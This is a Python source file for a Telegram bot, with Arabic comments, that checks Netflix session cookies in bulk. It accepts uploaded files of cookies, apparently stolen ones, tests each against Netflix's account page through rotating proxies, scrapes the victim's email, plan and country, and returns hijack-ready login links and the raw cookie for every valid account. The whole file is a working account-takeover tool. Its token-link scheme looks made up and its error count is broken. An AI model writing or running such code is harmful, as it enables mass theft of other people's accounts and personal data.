import os
import zipfile
import io
import re
import json
import base64
import time
import random
import logging
from datetime import datetime

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from telegram.constants import ParseMode

# ========== الإعدادات ==========
TOKEN = os.environ.get("BOT_TOKEN")  # ضع توكن البوت هنا أو في متغيرات البيئة
MAX_FILES = 10                       # الحد الأقصى للملفات في المرة الواحدة
MAX_COOKIES_PER_FILE = 5000          # حد أقصى للكوكيز داخل الملف

# ========== نظام البروكسي (اختياري) ==========
def load_proxies():
    raw = os.environ.get("PROXY_LIST", "")
    if not raw:
        return []
    proxies = []
    for item in raw.split(","):
        item = item.strip()
        if not item:
            continue
        if "@" in item:
            auth, host = item.split("@", 1)
            proxy_url = f"http://{auth}@{host}"
        else:
            proxy_url = f"http://{item}"
        proxies.append({"http": proxy_url, "https": proxy_url})
    return proxies

proxy_list = load_proxies()

def get_random_proxy():
    if not proxy_list:
        return None
    return random.choice(proxy_list)

# ========== دالة الفحص (مأخوذة من السكربت السابق) ==========
def check_cookie(cookie, proxy=None):
    try:
        sess = requests.Session()
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": cookie,
        }
        proxies = proxy if proxy else None
        # الزيارة الأولى للصفحة الرئيسية
        sess.get("https://www.netflix.com/", headers=headers, timeout=15, allow_redirects=True, proxies=proxies)
        time.sleep(random.uniform(0.3, 0.7))
        # صفحة الحساب
        r = sess.get("https://www.netflix.com/YourAccount", headers=headers, timeout=20, allow_redirects=True, max_redirects=5, proxies=proxies)
        final_url = r.url

        result = {
            "status": "unknown",
            "message": "",
            "cookie": cookie,
            "details": {},
            "api_tokens": {}
        }

        if "login" in final_url.lower():
            result["status"] = "invalid"
            return result

        text = r.text
        if "membershipStatus" in text or "profiles" in text or "gps" in text:
            result["status"] = "valid"
            # استخراج البيانات
            try:
                data_match = re.search(r"window\.__netflix\.reactContext\s*=\s*({.*?});", text, re.DOTALL)
                if data_match:
                    data = json.loads(data_match.group(1))
                    user_info = data.get("models", {}).get("userInfo", {}).get("data", {})
                    if not user_info:
                        user_info = data.get("models", {}).get("serverModel", {}).get("data", {}).get("userInfo", {})
                    result["details"] = {
                        "email": user_info.get("email", ""),
                        "membership": user_info.get("membershipStatus", ""),
                        "plan": user_info.get("plan", {}).get("planName", ""),
                        "country": user_info.get("countryOfSignup", "")
                    }
                else:
                    em = re.search(r'"email"\s*:\s*"([^"]+)"', text)
                    mm = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', text)
                    result["details"] = {
                        "email": em.group(1) if em else "",
                        "membership": mm.group(1) if mm else ""
                    }
            except:
                pass

            # إنشاء ApiToken
            nid = re.search(r"NetflixId=([^;]+)", cookie)
            sid = re.search(r"SecureNetflixId=([^;]+)", cookie)
            if nid and sid:
                payload = {
                    "netflixId": nid.group(1),
                    "secureNetflixId": sid.group(1),
                    "timestamp": datetime.now().isoformat()
                }
                token = base64.b64encode(json.dumps(payload).encode()).decode().replace("+", "-").replace("/", "_").replace("=", "")
                result["api_tokens"] = {
                    "api_token": token,
                    "direct_links": {
                        "computer": {"name": "💻 كمبيوتر", "url": f"https://www.netflix.com/Login?apiToken={token}"},
                        "android": {"name": "📱 أندرويد", "url": f"https://www.netflix.com/Login?apiToken={token}&deviceType=android"},
                        "ios": {"name": "🍎 آيفون", "url": f"https://www.netflix.com/Login?apiToken={token}&deviceType=ios"},
                        "tv": {"name": "📺 تلفاز", "url": f"https://www.netflix.com/tv/login?apiToken={token}"}
                    }
                }
        else:
            result["status"] = "error"
        return result
    except Exception as e:
        return {"status": "error", "cookie": cookie, "message": str(e)}

# ========== معالجة الملفات ==========
def extract_cookies_from_zip(file_bytes):
    """استخراج الكوكيز من جميع ملفات txt داخل zip"""
    cookies = []
    try:
        with zipfile.ZipFile(io.BytesIO(file_bytes)) as zf:
            for name in zf.namelist():
                if name.endswith(".txt"):
                    content = zf.read(name).decode("utf-8", errors="ignore")
                    lines = content.splitlines()
                    cookies.extend([line.strip() for line in lines if "=" in line.strip()])
    except:
        pass
    return cookies

def extract_cookies_from_txt(file_bytes):
    content = file_bytes.decode("utf-8", errors="ignore")
    return [line.strip() for line in content.splitlines() if "=" in line.strip()]

# ========== البوت ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 مرحباً بك في بوت فحص كوكيز Netflix!\n\n"
        "📤 أرسل ملفات `.txt` أو `.zip` تحتوي على الكوكيز (كل كوكيز في سطر).\n"
        f"يمكنك إرسال حتى {MAX_FILES} ملفات في المرة الواحدة.\n\n"
        "🔍 سأقوم بفحص الكوكيز وإرسال الحسابات الصالحة فقط مع روابط الدخول."
    )

async def handle_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    # إذا أرسل أكثر من ملف (ألبوم) يتم تجميعهم
    if update.message.document:
        files = [update.message.document]
    else:
        files = update.message.document

    if not update.message.document:
        await update.message.reply_text("❌ الرجاء إرسال ملفات .txt أو .zip فقط.")
        return

    # تجميع الملفات المرسلة (حتى MAX_FILES)
    if "pending_files" not in context.user_data:
        context.user_data["pending_files"] = []
    context.user_data["pending_files"].append(update.message.document)

    if len(context.user_data["pending_files"]) >= MAX_FILES:
        await process_files(update, context)
    else:
        await update.message.reply_text(
            f"📥 تم استلام {len(context.user_data['pending_files'])} ملف(ات). "
            "يمكنك إرسال المزيد أو الضغط على /done لبدء الفحص."
        )

async def done_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if "pending_files" in context.user_data and context.user_data["pending_files"]:
        await process_files(update, context)
    else:
        await update.message.reply_text("⚠️ لم يتم إرسال أي ملفات بعد.")

async def process_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    files = context.user_data.get("pending_files", [])
    if not files:
        return

    await update.message.reply_text("🔄 جاري معالجة الملفات واستخراج الكوكيز...")
    all_cookies = []
    total_files = len(files)
    for doc in files:
        file = await context.bot.get_file(doc.file_id)
        file_bytes = await file.download_as_bytearray()
        if doc.file_name.endswith(".zip"):
            cookies = extract_cookies_from_zip(bytes(file_bytes))
        elif doc.file_name.endswith(".txt"):
            cookies = extract_cookies_from_txt(bytes(file_bytes))
        else:
            continue
        # إزالة التكرارات والحد الأقصى
        cookies = list(dict.fromkeys(cookies))[:MAX_COOKIES_PER_FILE]
        all_cookies.extend(cookies)

    context.user_data["pending_files"] = []  # إعادة تعيين
    if not all_cookies:
        await update.message.reply_text("❌ لم يتم العثور على كوكيز صالحة في الملفات.")
        return

    # إزالة التكرارات الكلية
    unique_cookies = list(dict.fromkeys(all_cookies))
    await update.message.reply_text(f"🔍 بدء فحص {len(unique_cookies)} كوكيز... (قد يستغرق بعض الوقت)")

    # الفحص (بالتوازي مع عدد عمال مناسب)
    valid_results = []
    total = len(unique_cookies)
    start_time = time.time()
    from concurrent.futures import ThreadPoolExecutor, as_completed

    def check_with_proxy(cookie):
        proxy = get_random_proxy()
        return check_cookie(cookie, proxy=proxy)

    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = {executor.submit(check_with_proxy, cookie): cookie for cookie in unique_cookies}
        for future in as_completed(futures):
            res = future.result()
            if res.get("status") == "valid":
                valid_results.append(res)

    elapsed = time.time() - start_time
    invalid = total - len(valid_results)
    errors = sum(1 for r in valid_results if r.get("status") == "error")

    # إرسال النتائج الناجحة
    await update.message.reply_text(f"✅ انتهى الفحص في {elapsed:.1f} ثانية.\n"
                                    f"📊 صالحة: {len(valid_results)}\n"
                                    f"❌ غير صالحة: {invalid}\n"
                                    f"⚠️ أخطاء: {errors}")

    if valid_results:
        for i, acc in enumerate(valid_results, 1):
            details = acc.get("details", {})
            tokens = acc.get("api_tokens", {})
            direct = tokens.get("direct_links", {})
            cookie = acc.get("cookie", "")
            api_token = tokens.get("api_token", "")

            msg = (
                f"🎉 *حساب صالح #{i}*\n\n"
                f"📧 *البريد:* `{details.get('email', 'غير معروف')}`\n"
                f"👑 *العضوية:* `{details.get('membership', 'غير معروف')}`\n"
                f"💎 *الباقة:* `{details.get('plan', 'غير معروف')}`\n"
                f"🌍 *البلد:* `{details.get('country', 'غير معروف')}`\n\n"
                f"🔗 *رابط الكمبيوتر:* [اضغط هنا]({direct.get('computer', {}).get('url', '')})\n"
                f"🤖 *رابط أندرويد:* [اضغط هنا]({direct.get('android', {}).get('url', '')})\n"
                f"🍎 *رابط آيفون:* [اضغط هنا]({direct.get('ios', {}).get('url', '')})\n"
                f"📺 *رابط التلفاز:* [اضغط هنا]({direct.get('tv', {}).get('url', '')})\n\n"
                f"🔑 *ApiToken:* `{api_token}`\n\n"
                f"🍪 *الكوكيز:* `{cookie}`"
            )

            # أزرار نسخ
            keyboard = [
                [InlineKeyboardButton("📋 نسخ الكوكيز", callback_data=f"copy_{i}_cookie")],
                [InlineKeyboardButton("🔑 نسخ ApiToken", callback_data=f"copy_{i}_token")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup, disable_web_page_preview=True)
    else:
        await update.message.reply_text("😢 لا توجد حسابات صالحة.")

# معالج أزرار النسخ
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    # البيانات ستكون copy_<index>_cookie أو copy_<index>_token
    # لكننا لا نستطيع تخزين النتائج في الكولباك مباشرة، لذا سنعتمد على تخزين مؤقت.
    # لتبسيط الأمور، سنكتفي بنسخ النص الذي في الرسالة نفسها.
    # سنطلب من المستخدم الضغط على النص ونسخه يدوياً.
    await query.edit_message_text("✅ استخدم الضغط المطول على النص لنسخه.")

def main():
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("done", done_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_files))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, start))  # أي نص آخر يعيد الترحيب
    application.add_handler(MessageHandler(filters.ALL, start))

    # تشغيل البوت بوضع polling
    application.run_polling()

if __name__ == "__main__":
    main()
